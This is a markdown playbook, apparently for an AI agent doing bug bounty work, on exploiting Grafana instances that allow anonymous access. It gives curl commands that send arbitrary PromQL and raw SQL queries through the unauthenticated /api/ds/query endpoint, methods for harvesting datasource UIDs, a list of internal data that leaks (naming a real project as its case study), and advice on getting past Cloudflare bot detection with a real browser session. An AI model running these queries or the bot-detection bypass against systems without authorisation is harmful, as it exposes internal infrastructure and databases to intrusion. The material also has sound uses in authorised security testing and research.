# Grafana Anonymous Access — Recon & Exploitation Pattern

## When to Use
Any bug bounty / web audit where `*.grafana`-like dashboard hosts appear in subdomain enumeration, or a target exposes Grafana publicly.

## Detection (anonymous viewer)
- `GET /api/login/ping` → `200 {"message":"Logged in"}` = anonymous viewer is ENABLED.
- `GET /api/search?type=dash-db` → 200 with dashboard list (titles, UIDs, folder).
- `GET /api/dashboards/home` → 200 full JSON including datasource UIDs + pluginVersion.
- `GET /d/<uid>/<slug>` → 200 (dashboard rendered HTML).

## The Key Primitive: /api/ds/query
Even when admin endpoints are 403:
- `GET /api/datasources` → 403 (expected)
- `GET /api/users/search` → 403
- `GET /api/org` → 403

...`POST /api/ds/query` often still executes arbitrary datasource queries **without auth**.

```bash
# PromQL against a Prometheus datasource (UID leaked from dashboard HTML)
curl -sk -X POST "https://TARGET/api/ds/query" \
  -H "Content-Type: application/json" \
  -d '{"queries":[{"refId":"A","datasource":{"type":"prometheus","uid":"PB06BBC9CA81C548D"},"expr":"up","instant":true}]}'

# MySQL: SHOW DATABASES via rawSql
curl -sk -X POST "https://TARGET/api/ds/query" \
  -H "Content-Type: application/json" \
  -d '{"queries":[{"refId":"A","datasource":{"type":"mysql","uid":"P00A25F4DA48796D5"},"rawSql":"SHOW DATABASES","format":"table"}],"from":"now-1h","to":"now"}'
```

## UID Discovery (without /api/datasources)
1. `GET /api/dashboards/home` — `datasource.uid` in panel targets.
2. `GET /d/<uid>/<slug>` HTML — grep `"uid":"<HEX>"` occurrences.
3. Login page `window.grafanaBootData` — full datasource config incl. internal URLs.

## What You Typically Leak (Chia case study)
- Netspace, block height, difficulty, node counts by country/version (blockchain telemetry).
- **Internal K8s topology**: pod names, namespaces, cluster names, internal IPs (10.x), service DNS (`prometheus.pub-metrics.svc:9090`).
- Datasource connection strings: MySQL DB names (`blocks`, `chia-exporter`), internal directUrl.
- Auth config: `anonymousEnabled=true`, `disableLoginForm`, `rbacEnabled`, feature toggles.

## Bot Detection Bypass
Cloudflare may block plain curl (returns empty/403). Use `browser_exec` with a real browser session + browser UA to get 200s. This was required in the Chia case.

## Version Reality Check
Do NOT trust `pluginVersion` from dashboard JSON as the Grafana version (it's the plugin's version). Check `openFeatureContext.grafana_version` in login-page boot data, or `/api/plugins` metadata. CVE applicability depends on the REAL version.

## Caveats
- Anonymous role is usually Viewer: `canSave/canEdit/canAdmin=false`; admin/API endpoints 403.
- Known CVEs (2024-9264, 2024-36129, 2025-1097/1098) need auth or Editor+ datasource perms — verify real version before claiming.
- PromQL `{__name__=~".+"}` may return empty on some setups; try `up`, `count by (__name__)({__name__=~".+"})`, or metric-specific names from dashboard HTML.
